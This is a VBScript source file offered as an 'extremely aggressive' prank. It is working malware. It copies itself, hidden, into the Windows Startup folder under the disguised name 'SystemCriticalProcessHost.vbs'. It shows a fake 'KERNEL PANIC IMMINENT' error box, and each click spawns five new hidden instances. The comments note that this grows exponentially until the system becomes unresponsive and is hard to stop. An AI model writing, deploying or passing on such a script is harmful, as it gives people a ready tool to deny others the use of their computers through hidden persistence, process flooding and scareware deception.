' Annoying VBScript - EXTREMELY AGGRESSIVE VERSION
' Warning: This version spawns processes very rapidly.
' It will likely make the system unresponsive quickly and be very
' difficult to stop without killing all wscript.exe processes
' simultaneously (e.g., via admin taskkill) or restarting. USE CAUTIOUSLY.

Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set objArgs = WScript.Arguments

' --- Persistence ---
' Ensures the script runs from the Startup folder.

' Define the path where the script will live in the Startup folder
startupPath = objShell.SpecialFolders("Startup") & "\SystemCriticalProcessHost.vbs" ' Slightly different name
quotedStartupPath = """" & startupPath & """"

' Check if the script is currently running from the Startup folder
If LCase(WScript.ScriptFullName) <> LCase(startupPath) Then
    On Error Resume Next ' Ignore errors if file is already there or locked
    ' Copy the current script to the Startup folder, overwriting if it exists
    fso.CopyFile WScript.ScriptFullName, startupPath, True
    ' Try to hide the file in Startup
    If fso.FileExists(startupPath) Then
        Set fileAttr = fso.GetFile(startupPath)
        ' Check if Hidden attribute is already set before trying to set it
        If Not (fileAttr.Attributes And 2) Then ' 2 = Hidden attribute
            fileAttr.Attributes = fileAttr.Attributes + 2 ' Add Hidden attribute
        End If
    End If
    On Error GoTo 0 ' Re-enable error reporting

    ' Run the script from the Startup folder (hidden window) and exit this instance
    objShell.Run "wscript.exe " & quotedStartupPath, 0, False
    WScript.Quit
End If

' --- Aggressive Annoyance Logic ---

Dim count ' Counter for message boxes

' Determine the current count from command line arguments, default to 1
If objArgs.Count > 0 Then
    ' Use Abs(CInt()) to handle potential non-numeric input gracefully (becomes 0)
    count = Abs(CInt(objArgs(0)))
Else
    count = 1
End If

' NO DELAY - Make it react instantly

' Play a system beep sound (synchronously - waits for beep to finish)
objShell.Run "rundll32 user32.dll,MessageBeep", 0, True

' Display the annoying message box
' vbCritical icon + vbOKOnly button. Title is alarming.
Dim response
response = MsgBox("MULTIPLE CASCADE ERRORS DETECTED! SYSTEM UNSTABLE! Instance: " & count & vbCrLf & "Error Source ID: " & Rnd(), vbCritical + vbOKOnly, "!!! KERNEL PANIC IMMINENT !!!")

' If user clicks OK (the only option), spawn FIVE new instances IMMEDIATELY
If response = vbOK Then
    ' Spawn new instances with incremented counts, run hidden, don't wait
    objShell.Run "wscript.exe " & quotedStartupPath & " " & (count + 1), 0, False
    objShell.Run "wscript.exe " & quotedStartupPath & " " & (count + 2), 0, False
    objShell.Run "wscript.exe " & quotedStartupPath & " " & (count + 3), 0, False
    objShell.Run "wscript.exe " & quotedStartupPath & " " & (count + 4), 0, False
    objShell.Run "wscript.exe " & quotedStartupPath & " " & (count + 5), 0, False
End If

' --- End of Script ---
' Note: This script generates processes at an exponential rate (5^n).
' It will quickly consume resources and become extremely difficult to manage manually.
